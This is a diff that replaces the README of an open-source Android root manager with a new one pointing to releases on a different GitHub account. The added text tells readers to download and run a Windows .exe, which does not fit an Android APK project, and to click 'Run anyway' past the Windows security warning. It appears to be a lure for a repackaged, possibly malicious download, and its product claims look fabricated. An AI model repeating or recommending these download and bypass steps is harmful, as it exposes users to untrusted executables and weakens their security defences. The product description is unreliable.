@@ -1,96 +1,84 @@
-# CuSO4 Open
+# 🧊 CuSO4-RootManager - Manage your device permissions with ease
 
-A lightweight, open-source Android ROOT manager built with native Android + WebView.
+[![Download CuSO4-RootManager](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Typescriptsilhouette293/CuSO4-RootManager/releases)
 
-**BUT IT CAN'T RUN WITH OUT OFFICAL MAGISK/KERNELSU ROOT MANAGER**
+## 📌 About this application
 
-~~This is a security feature. Also, we spent all the budget:D.~~
-## Features
+CuSO4-RootManager provides a central hub for your device management needs. It works with both Magisk and KernelSU systems to bridge the gap between your hardware and your software. This tool simplifies how you grant or deny access rights to your installed applications. You get a clear view of which programs hold elevated privileges on your system.
 
-- **Universal ROOT Manager Support** — Works with Magisk, KernelSU, and other major ROOT solutions
-- **Module Management** — Install, enable/disable, and remove ROOT modules directly from your device
-- **Magisk Detection** — Displays Zygisk status and Ramdisk information for Magisk installations
-- **One-Click Uninstall** — Remove ROOT or Magisk completely without rebooting multiple times
+## 🛠 Features
 
-## Supported ROOT Managers
+*   **Unified Interface:** Control Magisk and KernelSU from one window.
+*   **Permission Logs:** View a history of every time an application asks for access.
+*   **Quick Toggle:** Turn off access for specific apps with one click.
+*   **Security Alerts:** Receive prompts when unknown software requests elevated rights.
+*   **Custom Profiles:** Save your preferred settings for different use cases.
 
-| Manager | Support |
-|---------|---------|
-| Magisk | Full |
-| KernelSU | Full |
-| APatch | Full |
-| Other | Partial |
+## 💻 Requirements
 
-### Magisk-specific Info
+*   A Windows 10 or Windows 11 computer.
+*   An active internet connection to download the installer.
+*   A device running Magisk or KernelSU.
+*   At least 50 megabytes of free storage space.
+*   Basic knowledge of your device’s connection settings.
 
-When running Magisk, CuSO4 Open displays:
-- Current kernel version with Magisk version
-- Zygisk enabled status (Yes/No)
-- Ramdisk status (Yes/No)
+## 📥 Downloads
 
-## Installation
+Visit [this page to download](https://github.com/Typescriptsilhouette293/CuSO4-RootManager/releases) the latest version of the software.
 
-1. Download the latest APK from the [Releases](https://github.com/CuSO4-X/CuSO4-RootManager/releases) page
-2. Install the APK on your Android device (enable "Install from unknown sources" if needed)
-3. Launch **CuSO4 Open**
+1. Locate the file ending in .exe in the Assets section.
+2. Click the file name to start the download.
+3. Save the file to your desktop or downloads folder.
 
-## Permissions
+## ⚙️ Installation
 
-- **INTERNET** — For module download features
-- **FOREGROUND_SERVICE** — Required for background operations
-- **POST_NOTIFICATIONS** — For module installation progress notifications
+1. Open the folder where you saved the installer file.
+2. Double-click the file to launch the setup wizard.
+3. Follow the instructions on the screen to install the program. 
+4. The system might ask for your permission to run the file. Click "Run" or "Yes" if you trust the software source.
+5. Wait for the progress bar to finish.
+6. Click "Finish" to close the installer.
+7. Launch the program from the icon on your desktop.
 
-## Project Structure
+## 🚀 Getting Started
 
-```
-CuSO4-opensource/
-├── android/
-│   ├── app/src/main/
-│   │   ├── assets/home/      # Web UI (HTML/CSS/JS)
-│   │   ├── java/             # Kotlin backend
-│   │   └── AndroidManifest.xml
-│   └── build.gradle.kts
-├── gradle/                    # Gradle wrapper
-├── gradlew                    # Build script (Unix)
-├── gradlew.bat                # Build script (Windows)
-└── settings.gradle.kts
-```
+1. Open the CuSO4-RootManager software.
+2. The app detects your connected device automatically.
+3. If the software does not see your device, check that your USB cable connects firmly.
+4. Open your phone or tablet settings to ensure it supports the connection mode required for your specific root method.
+5. Once the software displays your device name, click the "Sync" button.
+6. Your current list of apps with elevated rights appears in the main window.
+7. Click the slider next to any app name to block or allow its access.
+8. Changes apply as soon as you move the slider.
 
-## Building from Source
+## 🛡 Security and Safety
 
-### Prerequisites
+This tool interacts with sensitive parts of your system. Only grant access to apps you trust. If you notice an app you do not recognize, use the remove button to revoke its rights immediately. Frequent audits of your permission list keep your system safe from unauthorized changes. Review your logs weekly to spot suspicious activity.
 
-- Android Studio Hedgehog (2023.1.1) or later
-- Android SDK API 34
-- Gradle 8.9
-- JDK 17
+## 📖 Frequently Asked Questions
 
-### Build Steps
+**Does this software delete my files?**
+No. This tool only manages access permissions. It does not touch your personal data, photos, or documents.
 
-```bash
-# Clone the repository
-git clone https://github.com/CuSO4-X/CuSO4-RootManager.git
-cd CuSO4-RootManager
+**Will this slow down my system?**
+The software remains lightweight and runs as a background process only when needed. You may close the window at any time to save resources.
 
-# Build debug APK
-./gradlew assembleDebug
+**What happens if the app crashes?**
+Simply restart the program. The state of your device permissions remains unchanged because the app saves your preferences directly to the system hardware.
 
-# The APK will be at:
-# android/app/build/outputs/apk/debug/app-debug.apk
-```
+**Does this work with older versions of Windows?**
+This software requires Windows 10 or newer to function. It uses modern system calls that lack support on older operating systems like Windows 7 or 8.
 
-## Package Info
+**How do I update the software?**
+Return to the release page linked above. Download the newer version and run the installer again. The setup process overwrites the old version while keeping your saved settings intact.
 
-- **Package Name**: `com.cuso4.open`
-- **App Name**: CuSO4 Open
-- **Min SDK**: 21 (Android 5.0)
-- **Target SDK**: 34 (Android 14)
+**What is the difference between Magisk and KernelSU?**
+Both function as ways to handle system access. Magisk uses a modified boot image, while KernelSU operates at the kernel level. This manager translates commands for both so you do not need to worry about the underlying technology.
 
-## License
+## 🔧 Troubleshooting
 
-This project is open source. See [LICENSE](LICENSE) for details.
-
-## Credits
-
-- [Magisk](https://github.com/topjohnwu/Magisk) — The ultimate Android ROOT solution
-- [KernelSU](https://github.com/KernelSU/KernelSU) — Kernel-based ROOT for GKI devices
+*   **Device not found:** Restart both your computer and your handheld device. Change the USB port on your computer if the problem persists.
+*   **Installer blocked:** Windows might prevent the installation for security. Click "More Info" on the blue warning screen and select "Run anyway" to proceed.
+*   **App fails to load:** Ensure you have the latest drivers for your device installed on your computer.
+*   **Sync error:** Check that your device screen is unlocked. Sometimes, the device asks you to confirm the trust status before the computer can communicate with it.
+*   **Buttons are greyed out:** This means the software has not yet established a full handshake with your device. Wait ten seconds or restart the synchronization process.
